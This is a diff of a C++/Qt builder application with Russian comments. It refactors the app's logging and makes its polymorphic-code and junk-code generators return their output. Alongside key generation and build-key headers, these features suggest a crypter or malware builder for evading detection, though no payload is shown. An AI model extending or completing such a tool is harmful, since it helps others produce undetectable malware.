@@ -36,6 +36,7 @@
 #include <bcrypt.h>
 
 #include "mainwindow.h"
+#include "ui_mainwindow.h"
 #include "build_key.h"
 #include "polymorphic_code.h"
 #include "junk_code.h"
@@ -1057,13 +1058,6 @@ void MainWindow::generateEncryptionKeys() {
     Log("Ключи шифрования и соль сгенерированы");
 }
 
-void MainWindow::appendLog(const QString& message) {
-    std::lock_guard<std::mutex> lock(g_mutex);
-    if (ui && ui->textEdit) {
-        ui->textEdit->append(message);
-    }
-}
-
 MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWindow) {
     ui->setupUi(this);
 
@@ -1096,14 +1090,6 @@ MainWindow::~MainWindow() {
 void MainWindow::emitLog(const QString& message) {
     std::lock_guard<std::mutex> lock(g_mutex);
     emit logUpdated(message);
-}
-
-// Добавление логов в UI с потокобезопасностью
-void MainWindow::appendLog(const QString& message) {
-    std::lock_guard<std::mutex> lock(g_mutex);
-    if (ui && ui->textEdit) {
-        QMetaObject::invokeMethod(ui->textEdit, "append", Qt::QueuedConnection, Q_ARG(QString, message));
-    }
 }
 
 // Генерация случайной строки с криптографически безопасным RNG
@@ -1496,7 +1482,7 @@ void MainWindow::replyFinished(QNetworkReply* reply) {
 }
 
 // Генерация полиморфного кода
-void MainWindow::generatePolymorphicCode() {
+std::string MainWindow::generatePolymorphicCode() {
     std::string polyCode = GeneratePolymorphicCode();
     std::ofstream outFile("polymorphic_code.h", std::ios::binary);
     if (outFile.is_open()) {
@@ -1506,6 +1492,7 @@ void MainWindow::generatePolymorphicCode() {
     } else {
         Log("Не удалось сгенерировать полиморфный код");
     }
+    return polyCode; // Возвращаем сгенерированный код
 }
 
 // Генерация заголовка ключей
@@ -1527,7 +1514,7 @@ void MainWindow::generateBuildKeyHeader() {
 }
 
 // Генерация мусорного кода
-void MainWindow::generateJunkCode() {
+std::string MainWindow::generateJunkCode() {
     std::string junkCode = GenerateJunkCode();
     std::ofstream outFile("junk_code_generated.h", std::ios::binary);
     if (outFile.is_open()) {
@@ -1540,6 +1527,7 @@ void MainWindow::generateJunkCode() {
     } else {
         Log("Не удалось сгенерировать мусорный код");
     }
+    return junkCode; // Возвращаем сгенерированный код
 }
 
 // Копирование иконки в директорию сборки
